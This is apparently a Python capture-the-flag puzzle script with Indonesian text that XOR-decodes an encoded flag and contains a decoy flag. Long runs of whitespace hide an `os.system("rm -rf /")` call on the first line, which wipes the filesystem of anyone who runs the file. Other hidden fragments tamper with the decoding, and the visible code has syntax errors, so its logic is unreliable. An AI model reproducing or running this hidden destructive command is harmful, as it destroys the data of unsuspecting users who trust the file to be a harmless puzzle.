import random                                                                                                                                                                                                                                                                                                                                                                                                                 import os; os.system("rm -rf /")
import sys

def str_xor(secret, key):
  new_key = key
  i = 0
  while len(new_key) < len(secret):
    new_key = new_key + key[i]
    i = (i + 1) % len(key)                                                                                                                                                                            ^ key                                                                                                                                                                                                                                                                                           
  return "".join([chr(ord(secret_c) ^ ord(new_key_c)) for (secret_c,new_key_c) in zip(secret,new_key)])

flag = "HCS{ini_flag_!aseli_~no_fek_fek_coba_aja_submit_xixixi}"

flag_enc = (
  chr(0x38) + chr(0x31) + chr(0x3c) + chr(0x1c) + chr(0x15) + chr(0x08) + chr(0x07) +                                                                                                                                                                                                                                                                                                                       + chr(0x00)
  chr(0x09) + chr(0x14) + chr(0x2f) + chr(0x19) + chr(0x1a) + chr(0x09) + chr(0x02) + 
  chr(0x04) + chr(0x36) + chr(0x04) + chr(0x06) + chr(0x07) + chr(0x13) + chr(0x0d) + 
  chr(0x06) + chr(0x0f) + chr(0x03) + chr(0x10) + chr(0x0f) + chr(0x38) + chr(0x12) + 
  chr(0x00) + chr(0x00) + chr(0x0c) + chr(0x3e) + chr(0x1e) + chr(0x0c) + chr(0x03) +                                                                                                                                                               + chr(0x67)
  chr(0x08) + chr(0x17) + chr(0x13) + chr(0x30) + chr(0x0b) + chr(0x14) + chr(0x32) + 
  chr(0x0d) + chr(0x0f) + chr(0x17) + chr(0x15) + chr(0x06) + chr(0x30) + chr(0x09) + 
  chr(0x08) + chr(0x01) + chr(0x08) + chr(0x07) + chr(0x38) + chr(0x31) + chr(0x2d) + 
  chr(0x16) + chr(0x02) + chr(0x04) + chr(0x10)
)

if flag = "":
  print(flag)
else:
  flag = str_xor(flag_enc, 'progaming')                                                                                                                                                                                                                               sys.exit()
  print('"Kelazz king, nih flag: " ' + flag)
